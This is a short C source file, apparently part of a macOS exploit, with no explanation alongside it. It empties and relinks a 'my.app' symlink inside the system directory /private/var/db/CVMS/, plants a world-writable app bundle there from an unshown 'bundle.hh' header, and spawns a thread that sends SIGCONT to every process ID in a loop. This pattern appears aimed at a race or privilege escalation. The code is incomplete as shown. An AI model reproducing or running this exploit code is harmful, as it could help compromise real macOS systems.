#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

char base[0x400];

void *handler(void *arg) {
	while(true) {
		for(int i = 0; i < 65536; i++)
			kill(i, SIGCONT);
		sleep(1);
	}
}

void write_file(const char *path, const void *ptr, size_t size) {
	int fd = open(path, O_CREAT | O_WRONLY, 0777);
	write(fd, ptr, size);
	close(fd);
}

void init_app() {
	strcpy(base, "/private/var/db/CVMS/");
	chdir(base);
	unlink("my.app");

	char randbuf[0x1000];
	sprintf(randbuf, "%lu.app", clock());
	symlink(randbuf, "my.app");

	mkdir(randbuf, 0777);
	chdir(randbuf);

#include "bundle.hh"
}

int main() {
	init_app();

	pthread_t thread;
	pthread_create(&thread, NULL, handler, NULL);
}
